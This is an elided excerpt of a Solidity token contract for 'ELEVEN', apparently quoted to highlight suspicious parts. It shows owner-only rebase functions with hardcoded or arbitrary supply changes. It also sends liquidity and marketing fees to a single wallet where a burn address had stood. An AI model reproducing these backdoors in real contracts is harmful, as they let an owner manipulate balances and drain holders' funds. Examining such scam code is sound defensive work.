...
https://twitter.com/eleven011_eth
http://www.eleventoken.co/
...
contract ELEVEN is ERC20Detailed, Ownable {
    ...
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 1_111_111_111 * 10**DECIMALS;
    ...
    function hawkinsIndiana ()
        external
        onlyMaster
        returns (uint256)
    {
        require(!inSwap, "Try again");
        uint256 epoch = 1000000000000000000;
        int256 supplyDelta = 1111000000000000000;
        if (supplyDelta == 0) {
        ...
        returns (uint256)
    {
     ...
     function manualKey(uint256 epoch, int256 supplyDelta)
        external
        onlyMaster
        returns (uint256)
    {
    ...
    constructor() ERC20Detailed("Eleven", "011", uint8(DECIMALS)) {
        ...
        autoLiquidityReceiver = 0xD0bfCD7ADa5974FE97675679846337DA62d21E0C; // 0x000000000000000000000000000000000000dEaD
        marketingFeeReceiver = 0xD0bfCD7ADa5974FE97675679846337DA62d21E0C; ////////////////////////////////////////////
    ...
    function swapBack() internal swapping {
        ...
        uint256 totalEth = amountETHMarketing + amountETHBuyBack + amountETHEco;
    ...
    function openGateway() external onlyOwner {
